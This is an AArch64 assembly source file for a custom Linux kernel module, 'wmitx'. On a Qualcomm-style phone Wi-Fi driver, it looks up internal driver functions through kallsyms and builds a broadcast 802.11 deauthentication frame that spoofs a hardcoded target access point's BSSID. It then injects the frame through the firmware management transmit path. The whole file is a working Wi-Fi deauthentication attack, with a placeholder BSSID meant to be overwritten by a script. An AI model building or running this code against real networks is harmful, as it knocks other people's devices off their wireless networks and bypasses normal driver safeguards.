/*
 * wmitx.S - Send deauth via WMI management TX path (works in monitor mode)
 * Bypasses data path entirely, uses wma_tx_packet like lim_send_deauth_mgmt_frame
 *
 * Build:
 *   clang -target aarch64-linux-gnu -c -o wmitx.o wmitx.S
 *   ld.lld -r -o wmitx.ko wmitx.o
 */

.section .gnu.linkonce.this_module, "aw"
.balign 256
__this_module:
    .fill 24, 1, 0
    .asciz "wmitx"
    .fill 50, 1, 0
    .fill 256, 1, 0
    .quad init_module
    .fill 440, 1, 0
    .quad cleanup_module
    .fill 40, 1, 0

.section .modinfo, "a"
    .asciz "vermagic=4.19.81-perf+ SMP preempt mod_unload modversions aarch64"
    .asciz "name=wmitx"
    .asciz "license=GPL"

.section __versions, "a"
    .quad 0
    .asciz "module_layout"
    .balign 64, 0
    .quad 0
    .asciz "printk"
    .balign 64, 0
    .quad 0
    .asciz "kallsyms_lookup_name"
    .balign 64, 0

.section .rodata, "a"
sym_cds_ctx:      .asciz "cds_get_context"
sym_pkt_alloc:    .asciz "cds_packet_alloc"
sym_wma_tx:       .asciz "wma_tx_packet"
sym_qdf_zero:     .asciz "qdf_mem_zero"

fmt_init:   .asciz "wmitx: sending deauth via WMI mgmt TX\n"
fmt_alloc:  .asciz "wmitx: frame=%px body=%px\n"
fmt_mac:    .asciz "wmitx: mac_ctx=%px\n"
fmt_tx:     .asciz "wmitx: wma_tx_packet returned %d\n"
fmt_fail:   .asciz "wmitx: FAILED at step %d\n"
fmt_ok:     .asciz "wmitx: deauth SENT OK\n"

/* Target BSSID - will be overwritten by script */
.balign 8
target_bssid: .byte 0x8c, 0xf0, 0xdf, 0x1f, 0x4f, 0xc7

.section .plt, "ax"
    .quad 0
.section .init.plt, "ax"
    .quad 0
.section .text.ftrace_trampoline, "ax"
    .quad 0

.section .exit.text, "ax"
.global cleanup_module
.type cleanup_module, @function
cleanup_module:
    ret

.section .init.text, "ax"
.global init_module
.type init_module, @function
init_module:
    sub sp, sp, #0xc0
    stp x29, x30, [sp, #0xb0]
    add x29, sp, #0xb0
    stp x19, x20, [sp, #0xa0]
    stp x21, x22, [sp, #0x90]
    stp x23, x24, [sp, #0x80]
    stp x25, x26, [sp, #0x70]

    adrp x0, fmt_init
    add x0, x0, :lo12:fmt_init
    bl printk

    // Step 1: Lookup all needed functions via kallsyms
    adrp x0, sym_cds_ctx
    add x0, x0, :lo12:sym_cds_ctx
    bl kallsyms_lookup_name
    cbz x0, fail1
    mov x19, x0              // x19 = cds_get_context

    adrp x0, sym_pkt_alloc
    add x0, x0, :lo12:sym_pkt_alloc
    bl kallsyms_lookup_name
    cbz x0, fail2
    mov x20, x0              // x20 = cds_packet_alloc

    adrp x0, sym_wma_tx
    add x0, x0, :lo12:sym_wma_tx
    bl kallsyms_lookup_name
    cbz x0, fail3
    mov x21, x0              // x21 = wma_tx_packet

    adrp x0, sym_qdf_zero
    add x0, x0, :lo12:sym_qdf_zero
    bl kallsyms_lookup_name
    mov x22, x0              // x22 = qdf_mem_zero (may be 0 OK)

    // Step 2: Allocate frame buffer via cds_packet_alloc
    // cds_packet_alloc(size, &body_ptr, &pkt_ptr) or similar
    // From disasm: cds_packet_alloc at cf400:
    //   w0 = frmLen (26 bytes: 24 header + 2 reason)
    //   x1 = &body_ptr (output)
    //   x2 = &pkt_ptr (output)
    mov w0, #26               // deauth frame: 24 + 2
    sub x1, x29, #0x10        // body_ptr output on stack
    sub x2, x29, #0x18        // pkt_ptr output on stack
    blr x20                   // cds_packet_alloc
    cbnz w0, fail4            // non-zero = error

    ldur x23, [x29, #-0x10]   // x23 = body (raw data pointer)
    ldur x24, [x29, #-0x18]   // x24 = pkt  (qdf_nbuf/cds_packet)

    adrp x0, fmt_alloc
    add x0, x0, :lo12:fmt_alloc
    mov x1, x24
    mov x2, x23
    bl printk

    // Step 3: Zero the frame
    cbz x22, skip_zero
    mov x0, x23
    mov w1, #26
    blr x22
skip_zero:

    // Step 4: Build 802.11 deauth frame header at x23
    // Frame Control: 0x00C0 = deauth (type=0, subtype=C)
    movz w8, #0x00C0
    strh w8, [x23]
    // Duration: 0
    strh wzr, [x23, #2]
    // DA: ff:ff:ff:ff:ff:ff (broadcast)
    movn w8, #0               // 0xffffffff
    str w8, [x23, #4]
    strh w8, [x23, #8]
    // SA: target BSSID (spoof as AP)
    adrp x9, target_bssid
    add x9, x9, :lo12:target_bssid
    ldr w8, [x9]
    str w8, [x23, #10]
    ldrh w8, [x9, #4]
    strh w8, [x23, #14]
    // BSSID: target BSSID
    ldr w8, [x9]
    str w8, [x23, #16]
    ldrh w8, [x9, #4]
    strh w8, [x23, #20]
    // Seq ctrl: 0
    strh wzr, [x23, #22]
    // Reason code: 7 (class 3 frame from non-associated)
    mov w8, #7
    strh w8, [x23, #24]

    // Step 5: Get MAC context
    mov w0, #0x36              // QDF_MODULE_ID_PE
    blr x19                    // cds_get_context(PE)
    cbz x0, fail5
    mov x25, x0                // x25 = mac_ctx

    adrp x0, fmt_mac
    add x0, x0, :lo12:fmt_mac
    mov x1, x25
    bl printk

    // Step 6: Call wma_tx_packet
    // Args:
    //   x0 = mac_ctx
    //   x1 = frame buffer (qdf_nbuf)
    //   w2 = frmLen (26)
    //   w3 = frmType (3 = SIR_MAC_MGMT_DEAUTH)
    //   w4 = txFlag (1 = ANI_TXDIR_TODS)
    //   w5 = sessionId (0)
    //   x6 = 0 (no tx_complete callback)
    //   x7 = body pointer
    // Stack args:
    //   [sp+0] = 0 (no download_comp callback)
    //   [sp+8] = 1 (noack)
    //   [sp+16] = 0 (vdev_id = 0)
    //   [sp+24] = 0 (tdls_flag)
    //   [sp+32] = 0 (channel_freq, 0=current)
    //   [sp+40] = 12 (rateid)

    // Set stack args
    str xzr, [sp]             // no download_comp callback
    mov w8, #1
    strb w8, [sp, #8]         // noack = 1
    strb wzr, [sp, #16]       // vdev_id = 0
    strb wzr, [sp, #24]       // tdls_flag = 0
    strh wzr, [sp, #32]       // channel_freq = 0 (current)
    mov w8, #12
    str w8, [sp, #40]         // rateid = 12

    mov x0, x25               // mac_ctx
    mov x1, x24               // frame buffer
    mov w2, #26                // frame length
    mov w3, #3                 // frmType = MGMT_DEAUTH
    mov w4, #1                 // txFlag = TODS
    mov w5, #0                 // sessionId = 0
    mov x6, xzr               // no callback
    mov x7, x23               // body pointer
    blr x21                   // wma_tx_packet(...)
    mov w26, w0

    adrp x0, fmt_tx
    add x0, x0, :lo12:fmt_tx
    mov w1, w26
    bl printk

    cbnz w26, fail6

    adrp x0, fmt_ok
    add x0, x0, :lo12:fmt_ok
    bl printk
    b done

fail1:
    mov w1, #1
    b print_fail
fail2:
    mov w1, #2
    b print_fail
fail3:
    mov w1, #3
    b print_fail
fail4:
    mov w1, #4
    b print_fail
fail5:
    mov w1, #5
    b print_fail
fail6:
    mov w1, #6
print_fail:
    adrp x0, fmt_fail
    add x0, x0, :lo12:fmt_fail
    bl printk

done:
    mov w0, #-1
    ldp x25, x26, [sp, #0x70]
    ldp x23, x24, [sp, #0x80]
    ldp x21, x22, [sp, #0x90]
    ldp x19, x20, [sp, #0xa0]
    ldp x29, x30, [sp, #0xb0]
    add sp, sp, #0xc0
    ret
